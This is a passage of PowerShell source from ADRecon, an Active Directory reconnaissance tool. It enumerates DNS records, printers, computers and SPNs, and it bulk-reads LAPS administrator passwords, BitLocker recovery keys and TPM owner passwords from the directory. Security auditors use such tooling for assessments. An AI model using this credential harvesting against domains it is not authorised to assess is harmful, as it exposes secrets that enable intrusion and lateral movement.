                        $ObjNode | Add-Member -MemberType NoteProperty -Name Age -Value $DNSRecord.Age
                        $ObjNode | Add-Member -MemberType NoteProperty -Name TimeStamp -Value $DNSRecord.TimeStamp
                        $ObjNode | Add-Member -MemberType NoteProperty -Name UpdatedAtSerial -Value $DNSRecord.UpdatedAtSerial
                        $ObjNode | Add-Member -MemberType NoteProperty -Name whenCreated -Value ([DateTime] $($_.Properties.whencreated))
                        $ObjNode | Add-Member -MemberType NoteProperty -Name whenChanged -Value ([DateTime] $($_.Properties.whenchanged))
                        # TO DO
                        #$ObjNode | Add-Member -MemberType NoteProperty -Name dNSTombstoned -Value $null
                        #$ObjNode | Add-Member -MemberType NoteProperty -Name ProtectedFromAccidentalDeletion -Value $null
                        $ObjNode | Add-Member -MemberType NoteProperty -Name showInAdvancedViewOnly -Value ([string] $($_.Properties.showinadvancedviewonly))
                        $ObjNode | Add-Member -MemberType NoteProperty -Name DistinguishedName -Value ([string] $($_.Properties.distinguishedname))
                        $ADDNSNodesObj += $ObjNode
                        If ($DNSRecord)
                        {
                            Remove-Variable DNSRecord
                        }
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name RecordCount -Value $null
                }
                $Obj | Add-Member -MemberType NoteProperty -Name USNCreated -Value ([string] $($_.Properties.usncreated))
                $Obj | Add-Member -MemberType NoteProperty -Name USNChanged -Value ([string] $($_.Properties.usnchanged))
                $Obj | Add-Member -MemberType NoteProperty -Name whenCreated -Value ([DateTime] $($_.Properties.whencreated))
                $Obj | Add-Member -MemberType NoteProperty -Name whenChanged -Value ([DateTime] $($_.Properties.whenchanged))
                $Obj | Add-Member -MemberType NoteProperty -Name DistinguishedName -Value ([string] $($_.Properties.distinguishedname))
                $ADDNSZonesObj += $Obj
            }
            Write-Verbose "[*] Total DNS Records: $([ADRecon.LDAPClass]::ObjectCount($ADDNSNodesObj))"
            Remove-Variable DNSZoneArray
        }
    }

    If ($ADDNSZonesObj)
    {
        Export-ADR $ADDNSZonesObj $ADROutputDir $OutputType "DNSZones"
        Remove-Variable ADDNSZonesObj
    }

    If ($ADDNSNodesObj)
    {
        Export-ADR $ADDNSNodesObj $ADROutputDir $OutputType "DNSNodes"
        Remove-Variable ADDNSNodesObj
    }
}

Function Get-ADRPrinter
{
<#
.SYNOPSIS
    Returns all printers in the current (or specified) domain.

.DESCRIPTION
    Returns all printers in the current (or specified) domain.

.PARAMETER Protocol
    [string]
    Which protocol to use; ADWS (default) or LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>

    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADPrinters = @( Get-ADObject -LDAPFilter '(objectCategory=printQueue)' -Properties driverName,driverVersion,Name,portName,printShareName,serverName,url,whenChanged,whenCreated )
        }
        Catch
        {
            Write-Warning "[Get-ADRPrinter] Error while enumerating printQueue Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADPrinters)
        {
            Write-Verbose "[*] Total Printers: $([ADRecon.ADWSClass]::ObjectCount($ADPrinters))"
            $PrintersObj = [ADRecon.ADWSClass]::PrinterParser($ADPrinters, $Threads)
            Remove-Variable ADPrinters
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(objectCategory=printQueue)"
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $ADPrinters = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRPrinter] Error while enumerating printQueue Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADPrinters)
        {
            $cnt = $([ADRecon.LDAPClass]::ObjectCount($ADPrinters))
            If ($cnt -ge 1)
            {
                Write-Verbose "[*] Total Printers: $cnt"
                $PrintersObj = [ADRecon.LDAPClass]::PrinterParser($ADPrinters, $Threads)
            }
            Remove-Variable ADPrinters
        }
    }

    If ($PrintersObj)
    {
        Return $PrintersObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRComputer
{
<#
.SYNOPSIS
    Returns all computers in the current (or specified) domain.

.DESCRIPTION
    Returns all computers in the current (or specified) domain.

.PARAMETER Protocol
    [string]
    Which protocol to use; ADWS (default) or LDAP.

.PARAMETER date
    [DateTime]
    Date when ADRecon was executed.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER DormantTimeSpan
    [int]
    Timespan for Dormant accounts. Default 90 days.

.PARAMTER PassMaxAge
    [int]
    Maximum machine account password age. Default 30 days
    https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/domain-member-maximum-machine-account-password-age

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $true)]
        [DateTime] $date,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $DormantTimeSpan = 90,

        [Parameter(Mandatory = $true)]
        [int] $PassMaxAge = 30,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADComputers = @( Get-ADComputer -Filter * -ResultPageSize $PageSize -Properties Description,DistinguishedName,DNSHostName,Enabled,IPv4Address,LastLogonDate,'msDS-AllowedToDelegateTo','ms-ds-CreatorSid','msDS-SupportedEncryptionTypes',Name,OperatingSystem,OperatingSystemHotfix,OperatingSystemServicePack,OperatingSystemVersion,PasswordLastSet,primaryGroupID,SamAccountName,SID,SIDHistory,TrustedForDelegation,TrustedToAuthForDelegation,UserAccountControl,whenChanged,whenCreated )
        }
        Catch
        {
            Write-Warning "[Get-ADRComputer] Error while enumerating Computer Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADComputers)
        {
            Write-Verbose "[*] Total Computers: $([ADRecon.ADWSClass]::ObjectCount($ADComputers))"
            $ComputerObj = [ADRecon.ADWSClass]::ComputerParser($ADComputers, $date, $DormantTimeSpan, $PassMaxAge, $Threads)
            Remove-Variable ADComputers
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(samAccountType=805306369)"
        $ObjSearcher.PropertiesToLoad.AddRange(("description","distinguishedname","dnshostname","lastlogontimestamp","msDS-AllowedToDelegateTo","ms-ds-CreatorSid","msDS-SupportedEncryptionTypes","name","objectsid","operatingsystem","operatingsystemhotfix","operatingsystemservicepack","operatingsystemversion","primarygroupid","pwdlastset","samaccountname","sidhistory","useraccountcontrol","whenchanged","whencreated"))
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $ADComputers = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRComputer] Error while enumerating Computer Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADComputers)
        {
            Write-Verbose "[*] Total Computers: $([ADRecon.LDAPClass]::ObjectCount($ADComputers))"
            $ComputerObj = [ADRecon.LDAPClass]::ComputerParser($ADComputers, $date, $DormantTimeSpan, $PassMaxAge, $Threads)
            Remove-Variable ADComputers
        }
    }

    If ($ComputerObj)
    {
        Return $ComputerObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRComputerSPN
{
<#
.SYNOPSIS
    Returns all computer service principal name (SPN) in the current (or specified) domain.

.DESCRIPTION
    Returns all computer service principal name (SPN) in the current (or specified) domain.

.PARAMETER Protocol
    [string]
    Which protocol to use; ADWS (default) or LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADComputers = @( Get-ADObject -LDAPFilter "(&(samAccountType=805306369)(servicePrincipalName=*))" -Properties Name,servicePrincipalName -ResultPageSize $PageSize )
        }
        Catch
        {
            Write-Warning "[Get-ADRComputerSPN] Error while enumerating ComputerSPN Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADComputers)
        {
            Write-Verbose "[*] Total ComputerSPNs: $([ADRecon.ADWSClass]::ObjectCount($ADComputers))"
            $ComputerSPNObj = [ADRecon.ADWSClass]::ComputerSPNParser($ADComputers, $Threads)
            Remove-Variable ADComputers
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(&(samAccountType=805306369)(servicePrincipalName=*))"
        $ObjSearcher.PropertiesToLoad.AddRange(("name","serviceprincipalname"))
        $ObjSearcher.SearchScope = "Subtree"
        Try
        {
            $ADComputers = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRComputerSPN] Error while enumerating ComputerSPN Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADComputers)
        {
            Write-Verbose "[*] Total ComputerSPNs: $([ADRecon.LDAPClass]::ObjectCount($ADComputers))"
            $ComputerSPNObj = [ADRecon.LDAPClass]::ComputerSPNParser($ADComputers, $Threads)
            Remove-Variable ADComputers
        }
    }

    If ($ComputerSPNObj)
    {
        Return $ComputerSPNObj
    }
    Else
    {
        Return $null
    }
}

# based on https://github.com/kfosaaen/Get-LAPSPasswords/blob/master/Get-LAPSPasswords.ps1
Function Get-ADRLAPSCheck
{
<#
.SYNOPSIS
    Returns all LAPS (local administrator) stored passwords in the current (or specified) domain.

.DESCRIPTION
    Returns all LAPS (local administrator) stored passwords in the current (or specified) domain. Other details such as the Password Expiration, whether the password is readable by the current user are also returned.

.PARAMETER Protocol
    [string]
    Which protocol to use; ADWS (default) or LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADComputers = @( Get-ADObject -LDAPFilter "(samAccountType=805306369)" -Properties CN,DNSHostName,'ms-Mcs-AdmPwd','ms-Mcs-AdmPwdExpirationTime' -ResultPageSize $PageSize )
        }
        Catch [System.ArgumentException]
        {
            Write-Warning "[*] LAPS is not implemented."
            Return $null
        }
        Catch
        {
            Write-Warning "[Get-ADRLAPSCheck] Error while enumerating LAPS Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADComputers)
        {
            Write-Verbose "[*] Total LAPS Objects: $([ADRecon.ADWSClass]::ObjectCount($ADComputers))"
            $LAPSObj = [ADRecon.ADWSClass]::LAPSParser($ADComputers, $Threads)
            Remove-Variable ADComputers
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(samAccountType=805306369)"
        $ObjSearcher.PropertiesToLoad.AddRange(("cn","dnshostname","ms-mcs-admpwd","ms-mcs-admpwdexpirationtime"))
        $ObjSearcher.SearchScope = "Subtree"
        Try
        {
            $ADComputers = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRLAPSCheck] Error while enumerating LAPS Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADComputers)
        {
            $LAPSCheck = [ADRecon.LDAPClass]::LAPSCheck($ADComputers)
            If (-Not $LAPSCheck)
            {
                Write-Warning "[*] LAPS is not implemented."
                Return $null
            }
            Else
            {
                Write-Verbose "[*] Total LAPS Objects: $([ADRecon.LDAPClass]::ObjectCount($ADComputers))"
                $LAPSObj = [ADRecon.LDAPClass]::LAPSParser($ADComputers, $Threads)
                Remove-Variable ADComputers
            }
        }
    }

    If ($LAPSObj)
    {
        Return $LAPSObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRBitLocker
{
<#
.SYNOPSIS
    Returns all BitLocker Recovery Keys stored in the current (or specified) domain.

.DESCRIPTION
    Returns all BitLocker Recovery Keys stored in the current (or specified) domain.

.PARAMETER Protocol
    [string]
    Which protocol to use; ADWS (default) or LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADBitLockerRecoveryKeys = Get-ADObject -LDAPFilter '(objectClass=msFVE-RecoveryInformation)' -Properties distinguishedName,msFVE-RecoveryPassword,msFVE-RecoveryGuid,msFVE-VolumeGuid,Name,whenCreated
        }
        Catch
        {
            Write-Warning "[Get-ADRBitLocker] Error while enumerating msFVE-RecoveryInformation Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADBitLockerRecoveryKeys)
        {
            $cnt = $([ADRecon.ADWSClass]::ObjectCount($ADBitLockerRecoveryKeys))
            If ($cnt -ge 1)
            {
                Write-Verbose "[*] Total BitLocker Recovery Keys: $cnt"
                $BitLockerObj = @()
                $ADBitLockerRecoveryKeys | ForEach-Object {
                    # Create the object for each instance.
                    $Obj = New-Object PSObject
                    $Obj | Add-Member -MemberType NoteProperty -Name "Distinguished Name" -Value $((($_.distinguishedName -split '}')[1]).substring(1))
                    $Obj | Add-Member -MemberType NoteProperty -Name "Name" -Value $_.Name
                    $Obj | Add-Member -MemberType NoteProperty -Name "whenCreated" -Value $_.whenCreated
                    $Obj | Add-Member -MemberType NoteProperty -Name "Recovery Key ID" -Value $([GUID] $_.'msFVE-RecoveryGuid')
                    $Obj | Add-Member -MemberType NoteProperty -Name "Recovery Key" -Value $_.'msFVE-RecoveryPassword'
                    $Obj | Add-Member -MemberType NoteProperty -Name "Volume GUID" -Value $([GUID] $_.'msFVE-VolumeGuid')
                    Try
                    {
                        $TempComp = Get-ADComputer -Identity $Obj.'Distinguished Name' -Properties msTPM-OwnerInformation,msTPM-TpmInformationForComputer
                    }
                    Catch
                    {
                        Write-Warning "[Get-ADRBitLocker] Error while enumerating $($Obj.'Distinguished Name') Computer Object"
                        Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                    }
                    If ($TempComp)
                    {
                        # msTPM-OwnerInformation (Vista/7 or Server 2008/R2)
                        $Obj | Add-Member -MemberType NoteProperty -Name "msTPM-OwnerInformation" -Value $TempComp.'msTPM-OwnerInformation'

                        # msTPM-TpmInformationForComputer (Windows 8/10 or Server 2012/R2)
                        $Obj | Add-Member -MemberType NoteProperty -Name "msTPM-TpmInformationForComputer" -Value $TempComp.'msTPM-TpmInformationForComputer'
                        If ($null -ne $TempComp.'msTPM-TpmInformationForComputer')
                        {
                            # Grab the TPM Owner Info from the msTPM-InformationObject
                            $TPMObject = Get-ADObject -Identity $TempComp.'msTPM-TpmInformationForComputer' -Properties msTPM-OwnerInformation
                            $TPMRecoveryInfo = $TPMObject.'msTPM-OwnerInformation'
                        }
                        Else
                        {
                            $TPMRecoveryInfo = $null
                        }
                    }
                    Else
                    {
                        $Obj | Add-Member -MemberType NoteProperty -Name "msTPM-OwnerInformation" -Value $null
                        $Obj | Add-Member -MemberType NoteProperty -Name "msTPM-TpmInformationForComputer" -Value $null
                        $TPMRecoveryInfo = $null

                    }
                    $Obj | Add-Member -MemberType NoteProperty -Name "TPM Owner Password" -Value $TPMRecoveryInfo
                    $BitLockerObj += $Obj
                }
            }
            Remove-Variable ADBitLockerRecoveryKeys
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(objectClass=msFVE-RecoveryInformation)"
        $ObjSearcher.PropertiesToLoad.AddRange(("distinguishedName","msfve-recoverypassword","msfve-recoveryguid","msfve-volumeguid","mstpm-ownerinformation","mstpm-tpminformationforcomputer","name","whencreated"))
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $ADBitLockerRecoveryKeys = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRBitLocker] Error while enumerating msFVE-RecoveryInformation Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADBitLockerRecoveryKeys)
        {
            $cnt = $([ADRecon.LDAPClass]::ObjectCount($ADBitLockerRecoveryKeys))
            If ($cnt -ge 1)
            {
                Write-Verbose "[*] Total BitLocker Recovery Keys: $cnt"
                $BitLockerObj = @()
                $ADBitLockerRecoveryKeys | ForEach-Object {
                    # Create the object for each instance.
                    $Obj = New-Object PSObject
                    $Obj | Add-Member -MemberType NoteProperty -Name "Distinguished Name" -Value $((($_.Properties.distinguishedname -split '}')[1]).substring(1))
                    $Obj | Add-Member -MemberType NoteProperty -Name "Name" -Value ([string] ($_.Properties.name))
                    $Obj | Add-Member -MemberType NoteProperty -Name "whenCreated" -Value ([DateTime] $($_.Properties.whencreated))
                    $Obj | Add-Member -MemberType NoteProperty -Name "Recovery Key ID" -Value $([GUID] $_.Properties.'msfve-recoveryguid'[0])
                    $Obj | Add-Member -MemberType NoteProperty -Name "Recovery Key" -Value ([string] ($_.Properties.'msfve-recoverypassword'))
                    $Obj | Add-Member -MemberType NoteProperty -Name "Volume GUID" -Value $([GUID] $_.Properties.'msfve-volumeguid'[0])

                    $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
                    $ObjSearcher.PageSize = $PageSize
                    $ObjSearcher.Filter = "(&(samAccountType=805306369)(distinguishedName=$($Obj.'Distinguished Name')))"
                    $ObjSearcher.PropertiesToLoad.AddRange(("mstpm-ownerinformation","mstpm-tpminformationforcomputer"))
                    $ObjSearcher.SearchScope = "Subtree"

                    Try
                    {
                        $TempComp = $ObjSearcher.FindAll()
                    }
                    Catch
                    {
                        Write-Warning "[Get-ADRBitLocker] Error while enumerating $($Obj.'Distinguished Name') Computer Object"
                        Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                    }
                    $ObjSearcher.dispose()

                    If ($TempComp)
                    {
                        # msTPM-OwnerInformation (Vista/7 or Server 2008/R2)
                        $Obj | Add-Member -MemberType NoteProperty -Name "msTPM-OwnerInformation" -Value $([string] $TempComp.Properties.'mstpm-ownerinformation')

                        # msTPM-TpmInformationForComputer (Windows 8/10 or Server 2012/R2)
                        $Obj | Add-Member -MemberType NoteProperty -Name "msTPM-TpmInformationForComputer" -Value $([string] $TempComp.Properties.'mstpm-tpminformationforcomputer')
                        If ($null -ne $TempComp.Properties.'mstpm-tpminformationforcomputer')
                        {
                            # Grab the TPM Owner Info from the msTPM-InformationObject
                            If ($Credential -ne [Management.Automation.PSCredential]::Empty)
                            {
                                $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($TempComp.Properties.'mstpm-tpminformationforcomputer')", $Credential.UserName,$Credential.GetNetworkCredential().Password
                                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
                                $objSearcherPath.PropertiesToLoad.AddRange(("mstpm-ownerinformation"))
                                Try
                                {
                                    $TPMObject = $objSearcherPath.FindAll()
                                }
                                Catch
                                {
                                    Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                                }
                                $objSearcherPath.dispose()

                                If ($TPMObject)
                                {
                                    $TPMRecoveryInfo = $([string] $TPMObject.Properties.'mstpm-ownerinformation')
                                }
                                Else
                                {
                                    $TPMRecoveryInfo = $null
                                }
                            }
                            Else
                            {
                                Try
                                {
                                    $TPMObject = ([ADSI]"LDAP://$($TempComp.Properties.'mstpm-tpminformationforcomputer')")
                                }
                                Catch
                                {
                                    Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                                }
                                If ($TPMObject)
                                {
                                    $TPMRecoveryInfo = $([string] $TPMObject.Properties.'mstpm-ownerinformation')
                                }
                                Else
                                {
                                    $TPMRecoveryInfo = $null
                                }
                            }
                        }
                    }
                    Else
                    {
                        $Obj | Add-Member -MemberType NoteProperty -Name "msTPM-OwnerInformation" -Value $null
                        $Obj | Add-Member -MemberType NoteProperty -Name "msTPM-TpmInformationForComputer" -Value $null
                        $TPMRecoveryInfo = $null
                    }
                    $Obj | Add-Member -MemberType NoteProperty -Name "TPM Owner Password" -Value $TPMRecoveryInfo
                    $BitLockerObj += $Obj
                }
            }
            Remove-Variable cnt
            Remove-Variable ADBitLockerRecoveryKeys
        }
    }

    If ($BitLockerObj)
    {
        Return $BitLockerObj
    }
    Else
    {
        Return $null
    }
}

# Modified ConvertFrom-SID function from https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
Function ConvertFrom-SID
{
<#
.SYNOPSIS
    Converts a security identifier (SID) to a group/user name.

    Author: Will Schroeder (@harmj0y)
    License: BSD 3-Clause

.DESCRIPTION
    Converts a security identifier string (SID) to a group/user name using IADsNameTranslate interface.

.PARAMETER Protocol
    [string]
    Which protocol to use; ADWS (default) or LDAP.

.PARAMETER ObjectSid
    Specifies one or more SIDs to convert.

.PARAMETER DomainFQDN
    Specifies the FQDN of the Domain.

.PARAMETER Credential
    Specifies an alternate credential to use for the translation.

.PARAMETER ResolveSIDs
    [bool]
    Whether to resolve SIDs in the ACLs module. (Default False)

.EXAMPLE

    ConvertFrom-SID S-1-5-21-890171859-3433809279-3366196753-1108

    TESTLAB\harmj0y

.EXAMPLE

    "S-1-5-21-890171859-3433809279-3366196753-1107", "S-1-5-21-890171859-3433809279-3366196753-1108", "S-1-5-32-562" | ConvertFrom-SID

    TESTLAB\WINDOWS2$
    TESTLAB\harmj0y
    BUILTIN\Distributed COM Users

.EXAMPLE

    $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm', $SecPassword)
    ConvertFrom-SID S-1-5-21-890171859-3433809279-3366196753-1108 -Credential $Cred

    TESTLAB\harmj0y

.INPUTS
    [String]
    Accepts one or more SID strings on the pipeline.

.OUTPUTS
    [String]
    The converted DOMAIN\username.
#>
    Param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $true)]
        [Alias('SID')]
        #[ValidatePattern('^S-1-.*')]
        [String]
        $ObjectSid,

        [Parameter(Mandatory = $false)]
        [string] $DomainFQDN,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false)]
        [bool] $ResolveSID = $false
    )

    BEGIN {
        # Name Translator Initialization Types
        # https://msdn.microsoft.com/en-us/library/aa772266%28v=vs.85%29.aspx
        $ADS_NAME_INITTYPE_DOMAIN   = 1 # Initializes a NameTranslate object by setting the domain that the object binds to.
        #$ADS_NAME_INITTYPE_SERVER   = 2 # Initializes a NameTranslate object by setting the server that the object binds to.
        $ADS_NAME_INITTYPE_GC       = 3 # Initializes a NameTranslate object by locating the global catalog that the object binds to.

        # Name Transator Name Types
        # https://msdn.microsoft.com/en-us/library/aa772267%28v=vs.85%29.aspx
        #$ADS_NAME_TYPE_1779                     = 1 # Name format as specified in RFC 1779. For example, "CN=Jeff Smith,CN=users,DC=Fabrikam,DC=com".
        #$ADS_NAME_TYPE_CANONICAL                = 2 # Canonical name format. For example, "Fabrikam.com/Users/Jeff Smith".
        $ADS_NAME_TYPE_NT4                      = 3 # Account name format used in Windows. For example, "Fabrikam\JeffSmith".
        #$ADS_NAME_TYPE_DISPLAY                  = 4 # Display name format. For example, "Jeff Smith".
        #$ADS_NAME_TYPE_DOMAIN_SIMPLE            = 5 # Simple domain name format. For example, "JeffSmith@Fabrikam.com".
        #$ADS_NAME_TYPE_ENTERPRISE_SIMPLE        = 6 # Simple enterprise name format. For example, "JeffSmith@Fabrikam.com".
        #$ADS_NAME_TYPE_GUID                     = 7 # Global Unique Identifier format. For example, "{95ee9fff-3436-11d1-b2b0-d15ae3ac8436}".
        $ADS_NAME_TYPE_UNKNOWN                  = 8 # Unknown name type. The system will estimate the format. This element is a meaningful option only with the IADsNameTranslate.Set or the IADsNameTranslate.SetEx method, but not with the IADsNameTranslate.Get or IADsNameTranslate.GetEx method.
        #$ADS_NAME_TYPE_USER_PRINCIPAL_NAME      = 9 # User principal name format. For example, "JeffSmith@Fabrikam.com".
        #$ADS_NAME_TYPE_CANONICAL_EX             = 10 # Extended canonical name format. For example, "Fabrikam.com/Users Jeff Smith".
        #$ADS_NAME_TYPE_SERVICE_PRINCIPAL_NAME   = 11 # Service principal name format. For example, "www/www.fabrikam.com@fabrikam.com".
        #$ADS_NAME_TYPE_SID_OR_SID_HISTORY_NAME  = 12 # A SID string, as defined in the Security Descriptor Definition Language (SDDL), for either the SID of the current object or one from the object SID history. For example, "O:AOG:DAD:(A;;RPWPCCDCLCSWRCWDWOGA;;;S-1-0-0)"

        # https://msdn.microsoft.com/en-us/library/aa772250.aspx
        #$ADS_CHASE_REFERRALS_NEVER       = (0x00) # The client should never chase the referred-to server. Setting this option prevents a client from contacting other servers in a referral process.
        #$ADS_CHASE_REFERRALS_SUBORDINATE = (0x20) # The client chases only subordinate referrals which are a subordinate naming context in a directory tree. For example, if the base search is requested for "DC=Fabrikam,DC=Com", and the server returns a result set and a referral of "DC=Sales,DC=Fabrikam,DC=Com" on the AdbSales server, the client can contact the AdbSales server to continue the search. The ADSI LDAP provider always turns off this flag for paged searches.
        #$ADS_CHASE_REFERRALS_EXTERNAL    = (0x40) # The client chases external referrals. For example, a client requests server A to perform a search for "DC=Fabrikam,DC=Com". However, server A does not contain the object, but knows that an independent server, B, owns it. It then refers the client to server B.
        $ADS_CHASE_REFERRALS_ALWAYS      = (0x60) # Referrals are chased for either the subordinate or external type.
    }

    PROCESS {
        $TargetSid = $($ObjectSid.TrimStart("O:"))
        $TargetSid = $($TargetSid.Trim('*'))
        If ($TargetSid -match '^S-1-.*')
        {
            Try
            {
                # try to resolve any built-in SIDs first - https://support.microsoft.com/en-us/kb/243330
                Switch ($TargetSid) {
                    'S-1-0'         { 'Null Authority' }
                    'S-1-0-0'       { 'Nobody' }
                    'S-1-1'         { 'World Authority' }
                    'S-1-1-0'       { 'Everyone' }
                    'S-1-2'         { 'Local Authority' }
                    'S-1-2-0'       { 'Local' }
                    'S-1-2-1'       { 'Console Logon ' }
                    'S-1-3'         { 'Creator Authority' }
                    'S-1-3-0'       { 'Creator Owner' }
                    'S-1-3-1'       { 'Creator Group' }
                    'S-1-3-2'       { 'Creator Owner Server' }
                    'S-1-3-3'       { 'Creator Group Server' }
                    'S-1-3-4'       { 'Owner Rights' }
                    'S-1-4'         { 'Non-unique Authority' }
                    'S-1-5'         { 'NT Authority' }
                    'S-1-5-1'       { 'Dialup' }
                    'S-1-5-2'       { 'Network' }
                    'S-1-5-3'       { 'Batch' }
                    'S-1-5-4'       { 'Interactive' }
                    'S-1-5-6'       { 'Service' }
                    'S-1-5-7'       { 'Anonymous' }
                    'S-1-5-8'       { 'Proxy' }
                    'S-1-5-9'       { 'Enterprise Domain Controllers' }
                    'S-1-5-10'      { 'Principal Self' }
                    'S-1-5-11'      { 'Authenticated Users' }
                    'S-1-5-12'      { 'Restricted Code' }
                    'S-1-5-13'      { 'Terminal Server Users' }
                    'S-1-5-14'      { 'Remote Interactive Logon' }
                    'S-1-5-15'      { 'This Organization ' }
                    'S-1-5-17'      { 'This Organization ' }
                    'S-1-5-18'      { 'Local System' }
